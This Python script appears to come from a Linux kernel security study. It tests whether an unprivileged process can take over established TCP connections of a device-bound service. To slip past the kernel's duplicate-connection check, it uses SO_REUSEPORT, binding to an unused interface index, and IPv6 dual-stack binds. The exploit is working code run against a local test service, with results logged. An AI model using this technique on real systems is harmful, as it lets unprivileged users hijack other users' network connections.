#!/usr/bin/env python3
"""Can an unprivileged user get into an established connection?

outgoing.py shows that holding a client's port is not enough: to receive
anything, the attacker needs the connection's own four-tuple, and
__inet_check_established() refuses a duplicate. It refuses it by comparing
the connecting socket's device with the existing socket's, and a socket with
no device matches any. A socket that *has* a device does not, so for a
connection of a device-bound socket the duplicate is not found.

A service pinned to an interface gives its device to every connection it
accepts: sk_bound_dev_if sits in struct sock_common, which sock_copy()
copies into each accepted child. This measures what an unprivileged user can
then do to one of those live connections.

  usage: established.py OUTDIR        (as root)

Writes OUTDIR/established.txt.
"""

import errno
import os
import pwd
import socket
import subprocess
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import services                                            # noqa: E402

SO_REUSEPORT = getattr(socket, "SO_REUSEPORT", 15)
SO_BINDTOIFINDEX = getattr(socket, "SO_BINDTOIFINDEX", 62)
NOBODY = pwd.getpwnam("nobody")
PORT = 19600
HOLD = 4.0
BODY = b"SERVED-" + b"y" * 2000


class PinnedService:
    """A service pinned to an interface, as a VRF or a BindToDevice= unit
    would run it, answering in two parts so a connection stays live."""

    def __init__(self, port, device="lo"):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE,
                             device.encode())
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(64)
        self.sock.settimeout(0.3)
        self.running = True
        self.served = 0
        self.thread = threading.Thread(target=self.loop, daemon=True)
        self.thread.start()

    def loop(self):
        while self.running:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                continue
            threading.Thread(target=self.serve, args=(conn,),
                             daemon=True).start()

    def serve(self, conn):
        try:
            conn.settimeout(HOLD + 5)
            conn.recv(1000)
            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n"
                         b"Connection: close\r\n\r\n" % len(BODY))
            time.sleep(HOLD)
            conn.sendall(BODY)
            self.served += 1
        except OSError:
            pass
        finally:
            conn.close()

    def stop(self):
        self.running = False
        self.thread.join(2)
        self.sock.close()


def children(port):
    """The connections the service has accepted: (local, remote)."""
    out = []
    try:
        with open("/proc/net/tcp") as f:
            next(f)
            for line in f:
                col = line.split()
                if col[3] != "01":                      # TCP_ESTABLISHED
                    continue
                la, lp = col[1].rsplit(":", 1)
                ra, rp = col[2].rsplit(":", 1)
                if int(lp, 16) == port:
                    out.append((services.hexaddr(la), port,
                                services.hexaddr(ra), int(rp, 16)))
    except OSError:
        pass
    return out


def unused_ifindex():
    used = set()
    for d in os.listdir("/sys/class/net"):
        try:
            with open("/sys/class/net/%s/ifindex" % d) as f:
                used.add(int(f.read().strip()))
        except OSError:
            pass
    i = 4242
    while i in used:
        i += 1
    return i


def sockets(axis, local_addr, local_port):
    """The seed and the hijacking socket, by the axis that opens the port.
    Neither depends on the live connection: they are the same two sockets
    attack.py uses against a listening port."""
    if axis == "device":
        seed = socket.socket()
        seed.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
        seed.setsockopt(socket.SOL_SOCKET, SO_BINDTOIFINDEX, unused_ifindex())
        hijack = socket.socket()
        hijack.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
        return seed, ("0.0.0.0", local_port), hijack, (local_addr, local_port)
    seed = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    seed.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
    seed.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
    hijack = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    hijack.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
    hijack.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
    return seed, ("::", local_port), hijack, ("::", local_port)


def attack(axis, local_addr, local_port, peer_addr, peer_port):
    steps = ["axis=%s" % axis]
    seed, saddr, hijack, haddr = sockets(axis, local_addr, local_port)

    control, caddr = sockets(axis, local_addr, local_port)[2:]
    try:
        control.bind(caddr)
        steps.append("control=admitted")
    except OSError as e:
        steps.append("control=%s" % errno.errorcode.get(e.errno, "?"))
    control.close()

    try:
        seed.bind(saddr)
        steps.append("seed=ok")
    except OSError as e:
        seed.close()
        hijack.close()
        return " ".join(steps + ["seed=%s" % errno.errorcode.get(e.errno, "?"),
                                 "hijack=not_attempted",
                                 "takeover=not_attempted"])

    try:
        hijack.bind(haddr)
        steps.append("hijack=ok")
    except OSError as e:
        hijack.close()
        seed.close()
        return " ".join(steps + ["hijack=%s" % errno.errorcode.get(e.errno, "?"),
                                 "takeover=not_attempted"])

    # The same four-tuple as the service's live connection.
    peer = peer_addr if axis == "device" else "::ffff:" + peer_addr
    try:
        hijack.settimeout(2)
        hijack.connect((peer, peer_port))
        steps.append("takeover=ok")
    except OSError as e:
        steps.append("takeover=%s" % errno.errorcode.get(e.errno, str(e.errno)))
    time.sleep(1)
    hijack.close()
    seed.close()
    return " ".join(steps)


def attacker(port, axis, rfd, wfd):
    os.setgroups([])
    os.setgid(NOBODY.pw_gid)
    os.setuid(NOBODY.pw_uid)
    out = os.fdopen(wfd, "w")
    os.set_blocking(rfd, False)

    seen = set()
    while True:
        for conn in children(port):
            if conn in seen:
                continue
            seen.add(conn)
            out.write("attempt %s\n" % attack(axis, *conn))
            out.flush()
        try:
            if os.read(rfd, 1) == b"":
                break
        except BlockingIOError:
            pass
        time.sleep(0.05)
    out.write("attempts %d\n" % len(seen))
    out.flush()
    os._exit(0)


def one(port, axis):
    """One connection on a fresh port, attacked or not."""
    service = PinnedService(port)
    pid, stop, from_child = None, None, None
    if axis:
        r1, w1 = os.pipe()
        r2, w2 = os.pipe()
        pid = os.fork()
        if pid == 0:
            os.close(w1)
            os.close(r2)
            attacker(port, axis, r1, w2)
        os.close(r1)
        os.close(w2)
        stop, from_child = os.fdopen(w1, "w"), os.fdopen(r2)

    rc = subprocess.run(["curl", "-s", "--max-time", str(HOLD + 8),
                         "http://127.0.0.1:%d/" % port], capture_output=True)
    ok = rc.returncode == 0 and BODY[:7] in rc.stdout

    got = []
    if axis:
        stop.close()
        got = [line.rstrip("\n") for line in from_child
               if line.startswith("attempt")]
        os.waitpid(pid, 0)
    service.stop()
    return ok, got


def main():
    if os.getuid() != 0:
        sys.exit("run as root")
    outdir = sys.argv[1]
    os.makedirs(outdir, exist_ok=True)
    services.setup_addresses()

    lines = ["kernel %s" % os.uname().release,
             "a service pinned to lo, one connection per port"]
    # Without an attacker first: the service and the client must work.
    base = sum(one(PORT + i, None)[0] for i in range(3))
    lines.append("unattacked: %d/3 transfers complete" % base)

    # Both axes that open the port, against the same device-bound service:
    # whether the connection can then be taken does not depend on which one
    # was used.
    for n, axis in enumerate(("device", "v6only")):
        ok = 0
        for i in range(3):
            # A fresh port each time, so the control stays meaningful: a
            # port the attacker has already bound keeps its summary.
            done, got = one(PORT + 10 + n * 10 + i, axis)
            ok += done
            lines += ["  " + line for line in got]
        lines.append("attacked over the %s axis: %d/3 transfers complete"
                     % (axis, ok))
    print("\n".join(lines))
    with open(os.path.join(outdir, "established.txt"), "w") as f:
        f.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    main()
